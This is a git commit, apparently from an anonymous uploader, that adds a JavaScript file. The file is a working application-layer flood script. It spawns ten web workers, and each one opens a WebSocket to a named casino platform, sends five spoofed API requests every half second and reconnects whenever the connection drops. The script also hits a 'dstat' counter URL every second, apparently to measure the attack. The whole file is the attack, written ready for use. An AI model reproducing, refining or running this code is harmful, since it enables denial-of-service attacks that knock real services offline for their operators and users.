e861b3ad193ac7c0f90cbb81e45b64ed2ddfb6e5
a1 <trctrw@proton.me>
2025-07-23 14:51:05 +0800

    Add files via upload

---
+++ 54f367hy.js
@@ -0,0 +1,129 @@
+const workerCode = `
+const msg1 = function () {
+    return {
+        "service": "connection",
+        "functionName": "isAlive",
+        "data": {
+            "_heartBeat": true,
+            "deviceType": 2,
+            "deviceId": "",
+            "platformId": "50",
+            "version": "2.1.44",
+            "uuid": "10000000-1000-4000-8000-100000000000".replace(/[018]/g, er => (+er ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> +er / 4).toString(16)),
+            "requestId": "RQ1",
+            "childPlatformId": "50"
+        }
+    }
+}
+const msg2 = function () {
+    return {
+        "functionName": "getConfig",
+        "data": {
+            "childPlatformId": "50",
+            "isReload": false,
+            "requestId": "RQ1",
+            "deviceType": 2,
+            "deviceId": "",
+            "platformId": "50",
+            "version": "2.1.44",
+            "uuid": "10000000-1000-4000-8000-100000000000".replace(/[018]/g, er => (+er ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> +er / 4).toString(16)),
+        },
+        "service": "platform"
+    }
+}
+
+const msg3 = function () {
+    return {
+        "functionName": "getFrontEndConfig",
+        "data": {
+            "code": "reward",
+            "platformId": "50",
+            "clientType": 1,
+            "childPlatformId": "50",
+            "requestId": "RQ1",
+            "deviceType": 1,
+            "deviceId": "",
+            "version": "2.1.44",
+            "uuid": "10000000-1000-4000-8000-100000000000".replace(/[018]/g, er => (+er ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> +er / 4).toString(16)),
+        },
+        "service": "platform"
+    }
+}
+
+
+const msg5 = function () {
+    return {
+        "functionName": "getPlatformAnnouncements",
+        "data": {
+            "childPlatformId": "50",
+            "requestId": "RQ1",
+            "deviceType": 2,
+            "deviceId": "",
+            "platformId": "50",
+            "version": "2.1.44",
+            "uuid": "10000000-1000-4000-8000-100000000000".replace(/[018]/g, er => (+er ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> +er / 4).toString(16)),
+        },
+        "service": "platform"
+    }
+}
+
+const msg6 = function () {
+    return {
+        "functionName": "getLiveDrawRewardConfigNew",
+        "data": {
+            "isJackpot": true,
+            "childPlatformId": "50",
+            "requestId": "RQ1",
+            "deviceType": 2,
+            "deviceId": "",
+            "platformId": "50",
+            "version": "2.1.44",
+            "uuid": "10000000-1000-4000-8000-100000000000".replace(/[018]/g, er => (+er ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> +er / 4).toString(16)),
+        },
+        "service": "platform"
+    }
+}
+
+let socket = null;
+let interval_id = null;
+
+onmessage = function fuckyou() {
+    socket = new WebSocket('wss://cp-ws.casinoplus.top/websocket', "10000000-1000-4000-8000-100000000000".replace(/[018]/g, er => (+er ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> +er / 4).toString(16)));
+
+    socket.onopen = function () {
+        console.log('socket.onopen')
+        interval_id = setInterval(() => {
+            if (socket.readyState === WebSocket.OPEN) {
+                socket.send(JSON.stringify(msg1()));
+                socket.send(JSON.stringify(msg2()));
+                socket.send(JSON.stringify(msg3()));
+
+                socket.send(JSON.stringify(msg5()));
+                socket.send(JSON.stringify(msg6()));
+            }
+        }, 500);
+    };
+
+    socket.onerror = function (err) {
+        console.error('Worker WebSocket error:', err);
+    };
+
+    socket.onclose = function () {
+        console.warn('Worker WebSocket closed');
+        clearInterval(interval_id);
+        fuckyou()
+    };
+};
+`;
+
+const blob = new Blob([workerCode], { type: 'application/javascript' });
+const workerUrl = URL.createObjectURL(blob);
+
+for (let i = 0; i < 10; i++) {
+    const worker = new Worker(workerUrl);
+    worker.postMessage({ a: 1 })
+}
+
+setInterval(function () {
+    fetch('https://layer7.wiki/dstat0723');
+}, 1000);
